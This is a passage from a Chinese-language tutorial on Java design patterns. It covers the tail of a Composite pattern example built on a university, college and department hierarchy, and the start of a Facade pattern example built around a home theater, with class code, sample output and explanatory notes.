class_">OrganizationComponent</span> &#123;<br><br>   <span class="hljs-comment">//没有集合</span><br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Department</span><span class="hljs-params">(String name, String des)</span> &#123;<br>      <span class="hljs-built_in">super</span>(name, des);<br>      <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>   &#125;<br><br>   <br>   <span class="hljs-comment">//add , remove 就不用写了，因为他是叶子节点</span><br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.getName();<br>   &#125;<br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDes</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.getDes();<br>   &#125;<br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(getName());<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>College</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.composite;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">College</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">OrganizationComponent</span> &#123;<br><br>   <span class="hljs-comment">//List 中 存放的Department</span><br>   List&lt;OrganizationComponent&gt; organizationComponents = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;OrganizationComponent&gt;();<br><br>   <span class="hljs-comment">// 构造器</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">College</span><span class="hljs-params">(String name, String des)</span> &#123;<br>      <span class="hljs-built_in">super</span>(name, des);<br>      <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>   &#125;<br><br>   <span class="hljs-comment">// 重写add</span><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(OrganizationComponent organizationComponent)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//  将来实际业务中，Colleage 的 add 和  University add 不一定完全一样</span><br>      organizationComponents.add(organizationComponent);<br>   &#125;<br><br>   <span class="hljs-comment">// 重写remove</span><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">remove</span><span class="hljs-params">(OrganizationComponent organizationComponent)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      organizationComponents.remove(organizationComponent);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.getName();<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDes</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.getDes();<br>   &#125;<br><br>   <span class="hljs-comment">// print方法，就是输出University 包含的学院</span><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot;--------------&quot;</span> + getName() + <span class="hljs-string">&quot;--------------&quot;</span>);<br>      <span class="hljs-comment">//遍历 organizationComponents </span><br>      <span class="hljs-keyword">for</span> (OrganizationComponent organizationComponent : organizationComponents) &#123;<br>         organizationComponent.print();<br>      &#125;<br>   &#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>University</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.composite;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-comment">//University 就是 Composite , 可以管理College</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">University</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">OrganizationComponent</span> &#123;<br><br>   List&lt;OrganizationComponent&gt; organizationComponents = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;OrganizationComponent&gt;();<br><br>   <span class="hljs-comment">// 构造器</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">University</span><span class="hljs-params">(String name, String des)</span> &#123;<br>      <span class="hljs-built_in">super</span>(name, des);<br>      <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>   &#125;<br><br>   <span class="hljs-comment">// 重写add</span><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(OrganizationComponent organizationComponent)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      organizationComponents.add(organizationComponent);<br>   &#125;<br><br>   <span class="hljs-comment">// 重写remove</span><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">remove</span><span class="hljs-params">(OrganizationComponent organizationComponent)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      organizationComponents.remove(organizationComponent);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.getName();<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDes</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.getDes();<br>   &#125;<br><br>   <span class="hljs-comment">// print方法，就是输出University 包含的学院</span><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot;--------------&quot;</span> + getName() + <span class="hljs-string">&quot;--------------&quot;</span>);<br>      <span class="hljs-comment">//遍历 organizationComponents </span><br>      <span class="hljs-keyword">for</span> (OrganizationComponent organizationComponent : organizationComponents) &#123;<br>         organizationComponent.print();<br>      &#125;<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.composite;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <br>      <span class="hljs-comment">//从大到小创建对象 学校</span><br>      <span class="hljs-type">OrganizationComponent</span> <span class="hljs-variable">university</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">University</span>(<span class="hljs-string">&quot;清华大学&quot;</span>, <span class="hljs-string">&quot; 中国顶级大学 &quot;</span>);<br>      <br>      <span class="hljs-comment">//创建 学院</span><br>      <span class="hljs-type">OrganizationComponent</span> <span class="hljs-variable">computerCollege</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">College</span>(<span class="hljs-string">&quot;计算机学院&quot;</span>, <span class="hljs-string">&quot; 计算机学院 &quot;</span>);<br>      <span class="hljs-type">OrganizationComponent</span> <span class="hljs-variable">infoEngineercollege</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">College</span>(<span class="hljs-string">&quot;信息工程学院&quot;</span>, <span class="hljs-string">&quot; 信息工程学院 &quot;</span>);<br>      <br>      <br>      <span class="hljs-comment">//创建各个学院下面的系(专业)</span><br>      computerCollege.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Department</span>(<span class="hljs-string">&quot;软件工程&quot;</span>, <span class="hljs-string">&quot; 软件工程不错 &quot;</span>));<br>      computerCollege.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Department</span>(<span class="hljs-string">&quot;网络工程&quot;</span>, <span class="hljs-string">&quot; 网络工程不错 &quot;</span>));<br>      computerCollege.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Department</span>(<span class="hljs-string">&quot;计算机科学与技术&quot;</span>, <span class="hljs-string">&quot; 计算机科学与技术是老牌的专业 &quot;</span>));<br>      <br>      <span class="hljs-comment">//</span><br>      infoEngineercollege.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Department</span>(<span class="hljs-string">&quot;通信工程&quot;</span>, <span class="hljs-string">&quot; 通信工程不好学 &quot;</span>));<br>      infoEngineercollege.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Department</span>(<span class="hljs-string">&quot;信息工程&quot;</span>, <span class="hljs-string">&quot; 信息工程好学 &quot;</span>));<br>      <br>      <span class="hljs-comment">//将学院加入到 学校</span><br>      university.add(computerCollege);<br>      university.add(infoEngineercollege);<br><br>      university.print();<br>      System.out.println(<span class="hljs-string">&quot;~~~~~~~~~~~~~~~~~~~~&quot;</span>);<br>      infoEngineercollege.print();<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>执行程序，输出结果：</p></blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">----------------------清华大学----------------------<br>--------------计算机学院--------------<br>软件工程<br>网络工程<br>计算机科学与技术<br>--------------信息工程学院--------------<br>通信工程<br><span class="hljs-section">信息工程</span><br><span class="hljs-section">~~~~~~~~~~~~~~~~~~~~</span><br>--------------信息工程学院--------------<br>通信工程<br>信息工程<br></code></pre></td></tr></table></figure><h2 id="组合模式的注意事项和细节"><a class="markdownIt-Anchor" href="#组合模式的注意事项和细节"></a> 组合模式的注意事项和细节</h2><ol><li><p>简化客户端操作。客户端只需要面对一致的对象而不用考虑整体部分或者节点叶子的问题。</p></li><li><p>具有较强的扩展性。当我们要更改组合对象时，我们只需要调整内部的层次关系，客户端不用做出任何改动.</p></li><li><p>方便创建出复杂的层次结构。客户端不用理会组合里面的组成细节，容易添加节点或者叶子从而创建出复杂的树形结构</p></li><li><p>需<strong>要遍历组织机构，或者处理的对象具有树形结构时</strong>, 非常<strong>适合使用组合模式</strong>.</p></li><li><p>要求较高的抽象性，如果<strong>节点和叶子有很多差异性的话</strong>，比如很多方法和属性都不一样**，不适合使用组合模**式</p></li></ol><h1 id="外观模式"><a class="markdownIt-Anchor" href="#外观模式"></a> 外观模式</h1><p>外观模式（FacadePattern）隐藏系统的复杂性，并向客户端提供了一个客户端可以访问系统的接口。这种类型的设计模式属于结构型模式，它向现有的系统添加一个接口，来隐藏系统的复杂性。</p><p>也叫门面模式。</p><h2 id="介绍-9"><a class="markdownIt-Anchor" href="#介绍-9"></a> 介绍</h2><p><strong>意图：</strong> 为子系统中的一组接口提供一个一致的界面，外观模式定义了一个高层接口，这个接口使得这一子系统更加容易使用。</p><p><strong>主要解决：</strong> 降低访问复杂系统的内部子系统时的复杂度，简化客户端之间的接口。</p><p><strong>何时使用：</strong> 1、客户端不需要知道系统内部的复杂联系，整个系统只需提供一个&quot;接待员&quot;即可。 2、定义系统的入口。</p><p><strong>如何解决：</strong> 客户端不与系统耦合，外观类与系统耦合。</p><p><strong>关键代码：</strong> 在客户端和复杂系统之间再加一层，这一层将调用顺序、依赖关系等处理好。</p><p><strong>应用实例：</strong> 1、去医院看病，可能要去挂号、门诊、划价、取药，让患者或患者家属觉得很复杂，如果有提供接待人员，只让接待人员来处理，就很方便。<br />2、JAVA 的三层开发模式。</p><p><strong>优点：</strong> 1、减少系统相互依赖。 2、提高灵活性。 3、提高了安全性。</p><p><strong>缺点：</strong> 不符合开闭原则，如果要改东西很麻烦，继承重写都不合适。</p><p><strong>使用场景：</strong> 1、为复杂的模块或子系统提供外界访问的模块。 2、子系统相对独立。 3、预防低水平人员带来的风险。</p><p><strong>注意事项：</strong> 在层次化结构中，可以使用外观模式定义系统中每一层的入口。</p><p><strong>外观模式原理类图:</strong></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230102193340583.png" alt="image-20230102193340583" /></p><p>对类图说明(分类外观模式的角色)</p><ol><li><p>外观类(Facade): 为调用端ᨀ 供统一的调用接口, 外观类知道哪些子系统负责处理请求,从而将调用端的请求代理给适当子系统对象</p></li><li><p>调用者(Client): 外观接口的调用者</p></li><li><p>子系统的集合：指模块或者子系统，处理 Facade 对象指派的任务，他是功能的实际<strong>供者</strong></p></li></ol><h2 id="实现-7"><a class="markdownIt-Anchor" href="#实现-7"></a> 实现</h2><p>组建一个家庭影院：</p><p>DVD播放器、投影仪、自动屏幕、环绕立体声、爆米花机,要求完成使用家庭影院的功能，其过程为：</p><p>直接用遥控器：统筹各设备开关</p><p>开爆米花机</p><p>放下屏幕</p><p>开投影仪</p><p>开音响</p><p>开DVD，选dvd</p><p>去拿爆米花</p><p>调暗灯光</p><p>播放</p><p>观影结束后，关闭各种设备</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230102193600188.png" alt="image-20230102193600188" /></p><p><code>HomeTheaterFacade</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.facade;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HomeTheaterFacade</span> &#123;<br>   <br>   <span class="hljs-comment">//定义各个子系统对象</span><br>   <span class="hljs-keyword">private</span> TheaterLight theaterLight;<br>   <span class="hljs-keyword">private</span> Popcorn popcorn;<br>   <span class="hljs-keyword">private</span> Stereo stereo;<br>   <span class="hljs-keyword">private</span> Projector projector;<br>   <span class="hljs-keyword">private</span> Screen screen;<br>   <span class="hljs-keyword">private</span> DVDPlayer dVDPlayer;<br>   <br>   <br>   <span class="hljs-comment">//构造器</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">HomeTheaterFacade</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-built_in">super</span>();<br>      <span class="hljs-built_in">this</span>.theaterLight = TheaterLight.getInstance();<br>      <span class="hljs-built_in">this</span>.popcorn = Popcorn.getInstance();<br>      <span class="hljs-built_in">this</span>.stereo = Stereo.getInstance();<br>      <span class="hljs-built_in">this</span>.projector = Projector.getInstance();<br>      <span class="hljs-built_in">this</span>.screen = Screen.getInstance();<br>      <span class="hljs-built_in">this</span>.dVDPlayer = DVDPlayer.getInstanc();<br>   &#125;<br><br>   <span class="hljs-comment">//操作分成 4 步</span><br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ready</span><span class="hljs-params">()</span> &#123;<br>      popcorn.on();<br>      popcorn.pop();<br>      screen.down();<br>      projector.on();<br>      stereo.on();<br>      dVDPlayer.on();<br>      theaterLight.dim();<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">play</span><span class="hljs-params">()</span> &#123;<br>      dVDPlayer.play();<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pause</span><span class="hljs-params">()</span> &#123;<br>      dVDPlayer.pause();<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">end</span><span class="hljs-params">()</span> &#123;<br>      popcorn.off();<br>      theaterLight.bright();<br>      screen.up();<br>      projector.off();<br>      stereo.off();<br>      dVDPlayer.off();<br>   &#125;   <br>&#125;<br></code></pre></td></tr></table></figure><p><code>DVDPlayer</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.facade;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DVDPlayer</span> &#123;<br>   <br>   <span class="hljs-comment">//使用单例模式, 使用饿汉式</span><br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">DVDPlayer</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DVDPlayer</span>();<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> DVDPlayer <span class="hljs-title function_">getInstanc</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> instance;<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">on</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; dvd on &quot;</span>);<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">off</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; dvd off &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">play</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; dvd is playing &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-comment">//....</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pause</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; dvd pause ..&quot;</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Popcorn</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.facade;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Popcorn</span> &#123;<br>   <br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Popcorn</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Popcorn</span>();<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Popcorn <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> instance;<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">on</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; popcorn on &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">off</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; popcorn ff &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pop</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; popcorn is poping  &quot;</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Projector</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.facade;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Projector</span> &#123;<br><br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Projector</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Projector</span>();<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Projector <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> instance;<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">on</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; Projector on &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">off</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; Projector ff &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">focus</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; Projector is Projector  &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Screen</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.facade;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Screen</span> &#123;<br><br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Screen</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Screen</span>();<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Screen <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> instance;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">up</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot; Screen up &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">down</span><span class="hljs-params">()</span> 